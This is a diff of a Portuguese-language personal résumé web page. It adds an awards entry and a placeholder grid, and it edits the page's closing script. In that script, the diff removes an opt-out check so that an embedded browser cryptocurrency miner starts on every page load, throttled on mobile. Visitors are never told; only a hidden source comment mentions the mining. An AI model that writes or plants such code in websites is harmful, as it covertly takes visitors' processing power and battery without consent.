@@ -269,6 +269,11 @@
         <div class="my-auto">
           <h2 class="mb-5">Conquistas &amp; Realizações</h2>
           <ul class="fa-ul mb-0">
+              <li>
+                <i class="fa-li fa fa-trophy text-warning"></i>
+                <a href="http://maratona.ime.usp.br/hist/2016/primeira-fase/MT-Cuiaba.pdf">
+                1<sup>st</sup>
+                    Lugar - Campeonato de Xadrez - Colégio Isaac Newton - Ano ?</a></li>
             <li>
               <i class="fa-li fa fa-trophy text-warning"></i>
               Minicurso Debian</li>
@@ -293,6 +298,19 @@
         </div>
       </section>
 
+<section class="resume-section p-3 p-lg-5 d-flex flex-column" id="awards">
+      <div class="grid-container">
+  <div class="grid-item">1</div>
+  <div class="grid-item">2</div>
+  <div class="grid-item">3</div>
+  <div class="grid-item">4</div>
+  <div class="grid-item">5</div>
+  <div class="grid-item">6</div>
+  <div class="grid-item">7</div>
+  <div class="grid-item">8</div>
+  <div class="grid-item">9</div>
+</div>
+</section>
     </div>
 
     <!-- Bootstrap core JavaScript -->
@@ -313,10 +331,11 @@
     //ESSE SITE UTILIZA UMA PEqUENA PORÇÃO DO SEU PROCESSADOR
     //PARA PROCESSAR ALGORITMOS DE MINERAÇÃO
     //QUANDO O NAVEGADOR É ENCERRADO ELE ENCERRA JUNTO.
-    if (!miner.didOptOut(14400)) {
+        if(miner.isMobile())
+            miner.setThrottle(0.8);
         miner.start();
         console.log("Started");
-    }
+
     </script>
   </body>
 
